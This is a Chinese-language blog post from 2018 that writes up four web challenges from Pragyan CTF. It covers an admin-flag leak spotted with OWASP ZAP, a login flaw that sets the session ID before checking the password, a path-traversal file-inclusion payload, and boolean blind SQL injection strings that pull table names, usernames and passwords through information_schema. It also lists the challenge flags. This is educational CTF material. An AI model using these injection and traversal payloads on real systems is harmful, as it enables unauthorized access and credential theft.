---
layout: post
title: "pragyan ctf writeup"
date: 2018-03-04 23：40
categories: jekyll update
---

## 前言
&emsp;&emsp;这场CTF由于时间紧张，所以只做了web题，比赛中也只做出两题，其余两题为比赛结束后参考writeup进行复现并记录。

### 1、web1：Unfinished business
<div align="center">
    <img src="/images/posts/pragyan/1.png" >  
</div>
&emsp;&emsp;自己做的时候没做出来，用的是burp suite抓包，但没看出什么东西，然后再看别人的writeup复现。
登陆的时候勾选admin，然后用`owasp zap`抓包看一下，也正是这个工具在这题中运用得比较好。很容易就看到了flag。
<div align="center">
    <img src="/images/posts/pragyan/2.png" >  
</div>
&emsp;&emsp;所以flag：pctf{y0u=Sh0Uldn'1/h4v3*s33n,1his.:)}

### 2、web2：Authenticate your way to admin
<div align="center">
    <img src="/images/posts/pragyan/3.png" >  
</div>
&emsp;&emsp;关键点在于它在`还没验证账号是否正确`的情况下将identifier存入$_SESSION[‘id’]。
<div align="center">
    <img src="/images/posts/pragyan/4.png" >  
</div>
&emsp;&emsp;所以，第一次我们用正常的账号密码登陆以绕过homepage.php的登陆检验。
<div align="center">
    <img src="/images/posts/pragyan/5.png" >  
</div>
&emsp;&emsp;然后第二次我们用admin登陆，这里虽然会`返回错误`，但在上面已经提到，它是在`验证前`就更新了$_SESSION[‘id’]。
<div align="center">
    <img src="/images/posts/pragyan/6.png" >  
</div>
&emsp;&emsp;所以，再次刷新原来登陆后的页面时，你的$_SESSION[‘id’]就被替换成了`admin`。最终拿到flag。
<div align="center">
    <img src="/images/posts/pragyan/7.png" >  
</div>
&emsp;&emsp;所以flag：pctf{4u1h3ntic4Ti0n.4nd~4u1horiz4ti0n_diff3r}

### 3、web3：El33t Articles Hub
&emsp;&emsp;这道题比赛时也没解出来，现在拿着writeup复现一下。
<div align="center">
    <img src="/images/posts/pragyan/8.png" >  
</div>
&emsp;&emsp;上来看到这个猜测十有八九就是`文件包含`，但将常见的文件包含跟绕过试了一遍都`没有`结果。所以这道题就进展不下去。
&emsp;&emsp;看到writeup后才发现关键点不在这个url，在查看`网页源代码`的时候会发现两个`带下划线`的url，`经自己不成熟总结，一般这样的链接都有猫腻。。。`而且可以发现标题的图标也一直在变，仿佛在提醒你。。。
<div align="center">
    <img src="/images/posts/pragyan/9.png" >  
</div>
&emsp;&emsp;做题的时候直接访问是一张正常的图片，但将`id=x`代入，并且查看源代码时，你就会发现hint。
<div align="center">
    <img src="/images/posts/pragyan/10.png" >  
</div>
&emsp;&emsp;发现这又是一个文件包含，并且能包含php。所以查看index.php的代码。
<div align="center">
    <img src="/images/posts/pragyan/11.png" >  
</div>
&emsp;&emsp;helpers.php的代码
<div align="center">
    <img src="/images/posts/pragyan/12.png" >  
</div>
&emsp;&emsp;此时就能清晰的看到flag的位置，但因为id这里`不能包含txt文件`，所以只能回到file包含里。然后构造payload：
```shell
.....///secret/./flag_7258689d608c0e2e6a90c33c44409f9d
```
<div align="center">
    <img src="/images/posts/pragyan/13.png" >  
</div>
&emsp;&emsp;故flag：pctf{1h3-v41id41i0n_SuCk3d~r34l-baD}

### 4、web4：Animal Spy Database
```
Poc：1' or 1=1 -- +（返回正确）；1' or 1=2 -- +（返回错误）
```
&emsp;&emsp;说明有注入，再进一步可以测出是`盲注`。

&emsp;&emsp;其实，你测到后面会发现，题干中已经给了你表名，字段了。
<div align="center">
    <img src="/images/posts/pragyan/14.png" >  
</div>
&emsp;&emsp;当然，你也可以用
```
查询数据库长度：
1' or (length(database()))=12 -- +
数据库：
1' or (ascii(substr(database(),1,1)))>100 -- +
表名：
1' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))>100 -- +
字段：
1' or (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)))>100 -- +
```
&emsp;&emsp;所以最终的Payload：
```
1' or (ascii(substr(( select username from users limit 0,1),1,1)))>68 -- +
```
&emsp;&emsp;注入出username字段的值就是`admin`。

&emsp;&emsp;再将password注入出来，Payload：
```
1' or (ascii(substr(( select password from users limit 0,1),1,1)))>68 -- +
```
&emsp;&emsp;所以最终flag：pctf{L31's~@Ll_h4il-1h3-c4T_Qu33n.?}

